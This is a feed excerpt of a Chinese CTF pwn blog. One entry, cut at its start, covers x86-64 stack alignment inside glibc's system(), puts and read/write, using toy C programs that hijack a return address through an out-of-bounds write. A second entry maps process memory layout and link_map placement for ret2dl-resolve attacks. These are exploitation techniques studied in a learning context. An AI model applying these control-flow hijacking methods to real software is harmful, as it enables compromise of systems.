</code></pre></div></div> <h5 id="直接看汇编还是太逆天了下面是ida的反汇编注意qword_21c840是intrqword_21c7a0是quit">   直接看汇编还是太逆天了，下面是IDA的反汇编，注意qword_21C840是&lt;intr&gt;，qword_21C7A0是&lt;quit&gt;</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">v16</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="p">(</span><span class="n">qword_21C840</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">qword_21C7A0</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="n">v16</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2LL</span> <span class="o">*</span> <span class="p">(</span><span class="n">qword_21C840</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">))</span> <span class="o">|</span> <span class="mi">4</span><span class="p">;</span>
  <span class="n">posix_spawnattr_init</span><span class="p">(</span><span class="n">v20</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setsigmask</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="n">v15</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setsigdefault</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="n">v16</span><span class="p">);</span>
  <span class="n">posix_spawnattr_setflags</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="mi">12LL</span><span class="p">);</span>
</code></pre></div></div> <h5 id="后续是各种posix的操作也就是开进程">   后续是各种posix的操作，也就是开进程。</h5> <h5 id="然后-检查下当前程序走向如果不是栈平衡的问题应该到达do_system536也就是说上面开进程的内容被跳过了">   然后, 检查下当前程序走向，如果不是栈平衡的问题，应该到达<code class="language-plaintext highlighter-rouge">do_system+536</code>，也就是说上面开进程的内容被跳过了</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7dd3973 &lt;do_system+115&gt;    movaps xmmword ptr <span class="o">[</span>rsp], xmm1                   &lt;<span class="o">[</span>0x7fffffffd638] not aligned to 16 bytes&gt;
   0x7ffff7dd3977 &lt;do_system+119&gt;    lock cmpxchg dword ptr <span class="o">[</span>rip + 0x1cbe01], edx
   0x7ffff7dd397f &lt;do_system+127&gt;    jne    do_system+816               &lt;do_system+816&gt;
 
   0x7ffff7dd3985 &lt;do_system+133&gt;    mov    eax, dword ptr <span class="o">[</span>rip + 0x1cbdf9]           EAX, <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 0
   0x7ffff7dd398b &lt;do_system+139&gt;    lea    edx, <span class="o">[</span>rax + 1]                            EDX <span class="o">=&gt;</span> 1
   0x7ffff7dd398e &lt;do_system+142&gt;    mov    dword ptr <span class="o">[</span>rip + 0x1cbdf0], edx           <span class="o">[</span>sa_refcntr] <span class="o">=&gt;</span> 1
   0x7ffff7dd3994 &lt;do_system+148&gt;    <span class="nb">test   </span>eax, eax                                  0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x10246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7dd3996 &lt;do_system+150&gt;  ✔ je     do_system+536               &lt;do_system+536&gt;
    ↓
   0x7ffff7dd3b18 &lt;do_system+536&gt;    lea    rbp, <span class="o">[</span>rsp + 0x180]                  RBP <span class="o">=&gt;</span> 0x7fffffffd7b8 ◂— 1
   0x7ffff7dd3b20 &lt;do_system+544&gt;    mov    rdx, r14                            RDX <span class="o">=&gt;</span> 0x7ffff7f9f840 <span class="o">(</span>intr<span class="o">)</span> ◂— 0
   0x7ffff7dd3b23 &lt;do_system+547&gt;    mov    edi, 2                              EDI <span class="o">=&gt;</span> 2
</code></pre></div></div> <h5 id="然后是有关rsp的操作这里是存放两个值到xmm4然后调用子函数__gi___libc_cleanup_push_defer-这是一个用于清理线程的函数-之后便没有相关操作了">   然后是有关<code class="language-plaintext highlighter-rouge">[rsp]</code>的操作，这里是存放两个值到xmm4，然后调用子函数<code class="language-plaintext highlighter-rouge">__GI___libc_cleanup_push_defer</code>, 这是一个用于清理线程的函数, 之后便没有相关操作了。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x7ffff7dd3b84 &lt;do_system+644&gt;:      movdqa xmm4,XMMWORD PTR <span class="o">[</span>rsp]
......
0x7ffff7dd3bb0 &lt;do_system+688&gt;:      movaps XMMWORD PTR <span class="o">[</span>rsp+0x20],xmm4
 0x7ffff7dd3bb5 &lt;do_system+693&gt;:      call   0x7ffff7e141c0 &lt;__GI___libc_cleanup_push_defer&gt;
</code></pre></div></div> <h5 id="再次总结system中通过r13r14将intr和quit放到xmm然后放到rsp方便后续的管理进程和线程-至于为什么非要放到xmm个人理解是这两个值是一起被使用的类似于一个结构体所以放在一个128bit寄存器比两个64bit更好至于intr和quit两个变量都放在glibc的bss默认都是0xrefs发现它们只在do_system中被使用但是都没有赋值感觉很奇怪">   再次总结，<code class="language-plaintext highlighter-rouge">system()</code>中通过r13,r14将&lt;intr&gt;和&lt;quit&gt;放到xmm，然后放到<code class="language-plaintext highlighter-rouge">[rsp]</code>，方便后续的管理进程和线程, 至于为什么非要放到xmm，个人理解是这两个值是一起被使用的，类似于一个结构体，所以放在一个128bit寄存器比两个64bit更好。<br/>   至于&lt;intr&gt;和&lt;quit&gt;，两个变量都放在glibc的.bss，默认都是0。Xrefs发现它们只在<code class="language-plaintext highlighter-rouge">do_system</code>中被使用，但是都没有赋值，感觉很奇怪。</h5> <p>ps: (来自很遥远的未来) 这种向量运算其实不算特别少见, 尤其是比较底层的各种库, 为了想办法尽量增加效率, 这种SIMD不在少数. 但是至少在X86_64上, 很多SIMD并不要求16字节对齐, 别的架构不太清楚, 其次一般也只有栈上的利用才容易导致不对齐的问题.</p> <h3 id="需要栈平衡的函数">需要栈平衡的函数</h3> <h5 id="在实际实践时发现不只有system需要16位诸如puts-scanf-printf等也会有类似的需求">   在实际实践时发现，不只有<code class="language-plaintext highlighter-rouge">system()</code>需要16位，诸如<code class="language-plaintext highlighter-rouge">puts</code>, <code class="language-plaintext highlighter-rouge">scanf</code>, <code class="language-plaintext highlighter-rouge">printf</code>等也会有类似的需求。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo2</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"LeakBox"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果是">   结果是</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ► 0x7ffff7e274c0 &lt;_int_malloc+2832&gt;    movaps xmmword ptr <span class="o">[</span>rsp + 0x10], xmm1     &lt;<span class="o">[</span>0x7fffffffd758] not aligned to 16 bytes&gt;
   0x7ffff7e274c5 &lt;_int_malloc+2837&gt;    mov    eax, dword ptr <span class="o">[</span>rbx + 8]           EAX, <span class="o">[</span>main_arena+8] <span class="o">=&gt;</span> 0
   0x7ffff7e274c8 &lt;_int_malloc+2840&gt;    <span class="nb">test   </span>eax, eax                           0 &amp; 0     EFLAGS <span class="o">=&gt;</span> 0x10246 <span class="o">[</span> cf PF af ZF sf IF <span class="nb">df </span>of <span class="o">]</span>
   0x7ffff7e274ca &lt;_int_malloc+2842&gt;  ✔ je     _int_malloc+3869            &lt;_int_malloc+3869&gt;

 ► 0   0x7ffff7e274c0 _int_malloc+2832
   1   0x7ffff7e279c9 tcache_init.part+57
   2   0x7ffff7e281de malloc+318
   3   0x7ffff7e281de malloc+318
   4   0x7ffff7e01ba4 _IO_file_doallocate+148
   5   0x7ffff7e10ce0 _IO_doallocbuf+80
   6   0x7ffff7e0ff60 _IO_file_overflow+416
   7   0x7ffff7e0e6d5 _IO_file_xsputn+213
   8   0x7ffff7e03f1c __GI__IO_puts+204
   9   0x555555555180 backdoor+23
</code></pre></div></div> <h5 id="不难发现-涉及malloc_io_file_xsputn都需要检查直白点说就是涉及io的都会有栈平衡问题但不保证是_io_file_xsputsn的问题比如vprintf本身就有xmm寄存器对齐要求其次堆分配malloc也会有这类问题但一般不会很显著">   不难发现, 涉及<code class="language-plaintext highlighter-rouge">malloc</code>，<code class="language-plaintext highlighter-rouge">_IO_file_xsputn</code>都需要检查，直白点说就是涉及IO的都会有栈平衡问题，但不保证是<code class="language-plaintext highlighter-rouge">_IO_file_xsputsn</code>的问题，比如vprintf本身就有xmm寄存器对齐要求<br/>   其次，堆分配(malloc)也会有这类问题，但一般不会很显著<br/></h5> <h5 id="你以为这就完了吗-怎么会如果io能跳过_io_file_xsputn不就可以正常运行了吗实际上write和read就是这样的-因为这两个单纯就是把syscall包装了一下">   你以为这就完了吗? 怎么会。如果IO能跳过<code class="language-plaintext highlighter-rouge">_IO_file_xsputn</code>，不就可以正常运行了吗,实际上<code class="language-plaintext highlighter-rouge">write</code>和<code class="language-plaintext highlighter-rouge">read</code>就是这样的, 因为这两个单纯就是把<code class="language-plaintext highlighter-rouge">syscall</code>包装了一下</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000001147D0 <span class="p">;</span> __unwind <span class="o">{</span>
.text:00000000001147D0                 endbr64                 <span class="p">;</span> Alternative name is <span class="s1">'__read'</span>
.text:00000000001147D4                 mov     eax, fs:18h
.text:00000000001147DC                 <span class="nb">test    </span>eax, eax
.text:00000000001147DE                 jnz     short loc_1147F0
.text:00000000001147E0                 syscall                 <span class="p">;</span> LINUX -
.text:00000000001147E2                 cmp     rax, 0FFFFFFFFFFFFF000h
.text:00000000001147E8                 ja      short loc_114840
.text:00000000001147EA                 retn
.text:00000000001147EA <span class="p">;</span>
</code></pre></div></div> <h5 id="再看一个demo">   再看一个demo</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// demo3</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">backdoor</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">website</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">website</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">website</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\n'</span><span class="p">;</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">website</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="n">array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="n">array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">backdoor</span><span class="p">;</span> <span class="c1">// 数组越界</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">test</span>
<span class="n">godbolt</span><span class="p">.</span><span class="n">org</span>
<span class="n">godbolt</span><span class="p">.</span><span class="n">org</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span>    <span class="mi">5924</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="p">.</span><span class="o">/</span><span class="n">test</span>

</code></pre></div></div> <h5 id="输入的是godboltorg-由于由于用的是read-不会在输入-n-时结束io-所以shell里输入结束后需要ctrl--d手动发出eof可以看到-无论read还是write都成功执行了-虽然segv了-是因为backdoor不是正常被调用的-所以ret地址位置没有填有效地址-最后返回的地址不合理">   输入的是godbolt.org, 由于由于用的是<code class="language-plaintext highlighter-rouge">read</code>, 不会在输入 ‘\n’ 时结束IO, 所以shell里输入结束后需要<code class="language-plaintext highlighter-rouge">Ctrl + D</code>手动发出EOF<br/>   可以看到, 无论<code class="language-plaintext highlighter-rouge">read</code>还是<code class="language-plaintext highlighter-rouge">write</code>都成功执行了, 虽然SEGV了, 是因为backdoor不是正常被调用的, 所以ret地址位置没有填有效地址, 最后返回的地址不合理<br/></h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><category term="X86"/><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">dl题内存布局初探</title><link href="https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2/" rel="alternate" type="text/html" title="dl题内存布局初探"/><published>2024-10-08T00:00:00+00:00</published><updated>2024-10-08T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/%E5%AF%B9%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E7%9A%84%E4%B8%80%E7%82%B9%E6%8E%A2%E7%B4%A2/"><![CDATA[<h3 id="前情提要">前情提要</h3> <h5 id="众所周知在选择dl攻击时往往没有回显也就是无法得到attachmentlibcld的在内存中的加载基址一般来说这三者的加载地址应该是互不相关的但根据个人经验来看libc和ld一般是连在一起的中间可能有别的内存页也就是知道其中一个的基址以及内存的布局就可以知道另一个的基址">   众所周知，在选择dl攻击时，往往没有回显，也就是无法得到attachment、libc、ld的在内存中的加载基址，<br/>   一般来说，这三者的加载地址应该是互不相关的，但根据个人经验来看，libc和ld一般是连在一起的（中间可能有别的内存页），也就是知道其中一个的基址以及内存的布局，就可以知道另一个的基址<br/></h5> <h5 id="那么__dl_runtime_resolve时如何找到这三者的关系依靠的是在ld中的linkmap表这个表记录三个文件或许更多的linkmap地址而linkmap中就含有加载基址的信息">   那么<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>时如何找到，这三者的关系，依靠的是在ld中的linkmap表，这个表记录三个文件（或许更多）的linkmap地址，而linkmap中就含有加载基址的信息。</h5> <h5 id="以下的所有调试和maps的查看均以之前的boss题为例但实际上重点在于该程序mmap一个0x2000大小可读写的内存段本文的一个重心将会是这个mmap得到的内存的相对位置">   以下的所有调试和maps的查看均以之前的boss题为例，但实际上重点在于该程序<code class="language-plaintext highlighter-rouge">mmap()</code>一个0x2000大小可读写的内存段，本文的一个重心将会是这个<code class="language-plaintext highlighter-rouge">mmap()</code>得到的内存的相对位置。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">linkmap</span>
<span class="n">Node</span>           <span class="n">Objfile</span>                                                            <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="o">&gt;</span> <span class="mh">0x555555554000</span> <span class="mh">0x555555557df8</span>  
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                                    <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                                    <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                                        <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span>  
</code></pre></div></div> <h5 id="值得注意的是linkmap的位置在ldso中的一段可读写的位置也就是说算好偏移就可以篡改linkmap">   值得注意的是，linkmap的位置在ld.so中的一段可读写的位置，也就是说算好偏移就可以篡改linkmap。</h5> <h3 id="调试方法不同时内存布局的不同">调试方法不同时内存布局的不同</h3> <h5 id="首先探索的是调试方法不同时内存布局的不同一般使用gdb有两种方法gdb-attachment以及gdb---pidxxxx也就是gdb直接调试文件或者链接进程进行调试实际上这两者就算仅仅是从效果上看就有很大不同">   首先探索的是调试方法不同时，内存布局的不同<br/>   一般使用<code class="language-plaintext highlighter-rouge">gdb</code>有两种方法，<code class="language-plaintext highlighter-rouge">gdb attachment</code>以及<code class="language-plaintext highlighter-rouge">gdb --pid=xxxx</code>，也就是<code class="language-plaintext highlighter-rouge">gdb</code>直接调试文件或者链接进程进行调试，实际上这两者就算仅仅是从效果上看就有很大不同。<br/></h5> <h5 id="首先看gdb---pidxxx的vmmap这个结果更加接近一个进程的真实vmmap也就是和cat-procxxxmaps的结果相近">   首先看<code class="language-plaintext highlighter-rouge">gdb --pid=xxx</code>的vmmap，这个结果更加接近一个进程的真实vmmap，也就是和<code class="language-plaintext highlighter-rouge">cat /proc/xxx/maps</code>的结果相近</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x5631723b9000     0x5631723ba000 r--p     1000      0 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723ba000     0x5631723bb000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bb000     0x5631723bc000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bc000     0x5631723bd000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x5631723bd000     0x5631723be000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x7f99a605f000     0x7f99a6062000 rw-p     3000      0 <span class="o">[</span>anon_7f99a605f]
    0x7f99a6062000     0x7f99a608a000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a608a000     0x7f99a621f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a621f000     0x7f99a6277000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a6277000     0x7f99a6278000 <span class="nt">---p</span>     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a6278000     0x7f99a627c000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a627c000     0x7f99a627e000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7f99a627e000     0x7f99a628b000 rw-p     d000      0 <span class="o">[</span>anon_7f99a627e]
    0x7f99a6298000     0x7f99a629c000 rw-p     4000      0 <span class="o">[</span>anon_7f99a6298] <span class="c"># &lt;---mmap得到的空间</span>
    0x7f99a629c000     0x7f99a629e000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a629e000     0x7f99a62c8000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62c8000     0x7f99a62d3000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62d4000     0x7f99a62d6000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7f99a62d6000     0x7f99a62d8000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffd84bf2000     0x7ffd84c14000 rw-p    22000      0 <span class="o">[</span>stack]
    0x7ffd84c46000     0x7ffd84c4a000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7ffd84c4a000     0x7ffd84c4c000 r-xp     2000      0 <span class="o">[</span>vdso]
</code></pre></div></div> <h5 id="然后是使用gdb-attachment的效果可以看到的是mmap得到的空间和ldso之间多了0x6000的vvar和vsdo这两个本来是在栈段下方的其次如果多次调试发现attachmentlibcld的加载地址实际上是固定的也就是0x5555555540000x7ffff7d830000x7ffff7fc3000实际上没变应该是出于方便调试所以固定了加载地址">   然后是使用<code class="language-plaintext highlighter-rouge">gdb attachment</code>的效果，可以看到的是mmap得到的空间和ld.so之间多了0x6000的<code class="language-plaintext highlighter-rouge">[vvar]和[vsdo]</code>，这两个本来是在栈段下方的。<br/>   其次，如果多次调试发现，attachment、libc、ld的加载地址实际上是固定的，也就是0x555555554000、0x7ffff7d83000、0x7ffff7fc3000实际上没变，应该是出于方便调试所以固定了加载地址。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555556000     0x555555557000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555557000     0x555555558000 r--p     1000   2000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/pwn/worktable/cnss2024/boss/src/attachment
    0x7ffff7d80000     0x7ffff7d83000 rw-p     3000      0 <span class="o">[</span>anon_7ffff7d80]
    0x7ffff7d83000     0x7ffff7dab000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dab000     0x7ffff7f40000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f40000     0x7ffff7f98000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f98000     0x7ffff7f99000 <span class="nt">---p</span>     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9d000     0x7ffff7f9f000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7f9f000     0x7ffff7fac000 rw-p     d000      0 <span class="o">[</span>anon_7ffff7f9f]
    0x7ffff7fb9000     0x7ffff7fbd000 rw-p     4000      0 <span class="o">[</span>anon_7ffff7fb9] <span class="c"># &lt;-- mmap得到的地方</span>
    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 <span class="o">[</span>vvar]
    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 <span class="o">[</span>vdso]
    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 <span class="o">[</span>stack]
</code></pre></div></div> <h3 id="使用patchelf后的内存布局">使用patchelf后的内存布局</h3> <h5 id="一般pwn题时尤其c的pwn题时会选择使用patchelf更改libc和ld为指定glibc版本的来获得和远程相近的本地环境但是patchelf也会使进程的内存布局发生变化">   一般pwn题时，尤其C的pwn题时，会选择使用<code class="language-plaintext highlighter-rouge">patchelf</code>，更改libc和ld为指定glibc版本的来获得和远程相近的本地环境，但是<code class="language-plaintext highlighter-rouge">patchelf</code>也会使进程的内存布局发生变化。<br/></h5> <h5 id="首先获得一个patchelf后的文件">   首先获得一个<code class="language-plaintext highlighter-rouge">patchelf</code>后的文件</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ldd attachment <span class="c"># patchelf之前</span>
        linux-vdso.so.1 <span class="o">(</span>0x00007ffd469a6000<span class="o">)</span>
        libc.so.6 <span class="o">=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f8a8e7db000<span class="o">)</span>
        /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f8a8ea1a000<span class="o">)</span>
<span class="nv">$ </span>patchelf <span class="nt">--replace-needed</span> libc.so.6 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6 attachment
<span class="nv">$ </span>patchelf <span class="nt">--set-interpreter</span> /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 attachment
<span class="nv">$ </span>ldd attachment
        linux-vdso.so.1 <span class="o">(</span>0x00007ffd73beb000<span class="o">)</span>
        /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6 <span class="o">(</span>0x00007f9a1054c000<span class="o">)</span>
        /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 <span class="o">=&gt;</span> /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f9a1077d000<span class="o">)</span>
</code></pre></div></div> <h5 id="然后gdb---pixxx尝试调试">   然后<code class="language-plaintext highlighter-rouge">gdb --pi=xxx</code>尝试调试。</h5> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x56272a397000     0x56272a398000 r--p     1000      0 /home/pwn/testtable/attachment
    0x56272a398000     0x56272a399000 r-xp     1000   1000 /home/pwn/testtable/attachment
    0x56272a399000     0x56272a39a000 r--p     1000   2000 /home/pwn/testtable/attachment
    0x56272a39a000     0x56272a39b000 r--p     1000   2000 /home/pwn/testtable/attachment
    0x56272a39b000     0x56272a39e000 rw-p     3000   3000 /home/pwn/testtable/attachment
    0x7fc2b8155000     0x7fc2b815a000 rw-p     5000      0 <span class="o">[</span>anon_7fc2b8155] <span class="c"># &lt;-----mmap的位置</span>
    0x7fc2b815a000     0x7fc2b8182000 r--p    28000      0 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8182000     0x7fc2b8317000 r-xp   195000  28000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8317000     0x7fc2b836f000 r--p    58000 1bd000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b836f000     0x7fc2b8373000 r--p     4000 214000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8373000     0x7fc2b8375000 rw-p     2000 218000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6
    0x7fc2b8375000     0x7fc2b8384000 rw-p     f000      0 <span class="o">[</span>anon_7fc2b8375]
    0x7fc2b8384000     0x7fc2b8386000 r--p     2000      0 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b8386000     0x7fc2b83b0000 r-xp    2a000   2000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b83b0000     0x7fc2b83bb000 r--p     b000  2c000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
    0x7fc2b83bc000     0x7fc2b83be000 r--p     2000  37000 /home/pwn/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2
